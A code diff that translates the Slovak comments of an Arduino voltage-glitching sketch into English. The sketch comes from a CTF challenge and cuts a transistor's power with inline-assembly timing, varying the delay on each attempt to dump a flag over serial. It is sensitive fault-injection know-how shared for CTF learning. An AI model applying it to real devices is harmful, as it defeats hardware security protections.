@@ -1,52 +1,51 @@
 /**
-* Upraveny kod utoku na firmver zo sutaze CTF
-* original prevzaty 2023-03-18 z: https://blog.securitybits.io/2019/06/voltage-glitching-on-the-cheap/
-* Miesto funkcie dgitalWrite() na ovladanie tranzistora pouzivame makra napisane v C Inline Assembly.
+* Upgraded code from CTF challenge
+* (2023-03-18) original from: https://blog.securitybits.io/2019/06/voltage-glitching-on-the-cheap/
+* Instead of the dgitalWrite() function to control the transistor we use macros for C Inline Assembly.
 */
 
 #include "asm.h"
 
-// definicia konstant pre pin, ktory ovlada tranzistor
+// define constants for pin which controls the transistor
 #define GLITCH_PIN 2
 #define GLITCH_PORT PORTD
 #define GLITCH_BIT 2
 
-// globalne premenne
+// global variables
 int incomingByte = 0;
 uint8_t glitchDelay = 1;
 
-// funkcia setup sa vola jedenkrat pri spusteni
+// the setup function runs once
 void setup() {
-    // inicializujeme seriovu komunikaciu
+    // initialize Serial communication
     Serial.begin(19200);
     Serial.println("Arduino is ready");
     
-    // nastavime pin do vystupneho modu
+    // set pin to output mode
     pinMode(GLITCH_PIN, OUTPUT);
     
-    // nastavime pin na logicku 1 (zapneme tranzistor)
+    // set pin to logic 1 (turn on transistor)
     digitalWrite(GLITCH_PIN, HIGH);
     delay(5000);
     
     Serial.println("Gliching is ready");
 }
 
-// funkcia, ktora ovlada tranzistor
+// function which controls the transistor
 void glitch() {
-    // ulozime globalnu premennu do registra pre pouzitie v asembleri
+    // store the global variable in a register for usage in assembly
     register uint8_t localDelay = glitchDelay;
 
-    // vypneme tranzistor
-    // _SFR_IO_ADDR staticky vypocita adresu I/O registra pre ovladanie pinu
+    // turn off transistor (_SFR_IO_ADDR statically calculates the address of I/O register)
     setPortOff(_SFR_IO_ADDR(GLITCH_PORT), GLITCH_BIT);
 
-    // procedura oneskorenia
+    // delay procedure
     asmDelay(localDelay);
 
-    // zapneme tranzistor
+    // turn on transistor
     setPortOn(_SFR_IO_ADDR(GLITCH_PORT), GLITCH_BIT);
     
-    // zvacsime pocet iteracii proceduri oneskorenia pre dalsi pokus o utok
+    // increment delay length for next attempt
     glitchDelay += 1;
     glitchDelay %= 20;
     
@@ -56,19 +55,19 @@ void glitch() {
     Serial.println();
 }
 
-// funkcia loop sa opakuje dookola -- hlavny beh programu
-// hlavna cast programu je rovnaka ako v povodnom kode
+// the loop function executes in an infinite loop
+// the main program is the same as in the original version
 void loop() {
-    // pokusime sa precitat flag
+    // try to read the flag
     for (int i = 0; i<200;i++){
         if (Serial.available() > 0) {
-            // precitame bajt po bajte
+            // read the incoming byte:
             incomingByte = Serial.read();
             Serial.print(char(incomingByte));
         }
     }
     
-    // pockame na stabilizaciu napatia a spustime dalsi utok
+    // wait for voltage to stabilize before next attempt
     delay(1000);
     glitch();
 }
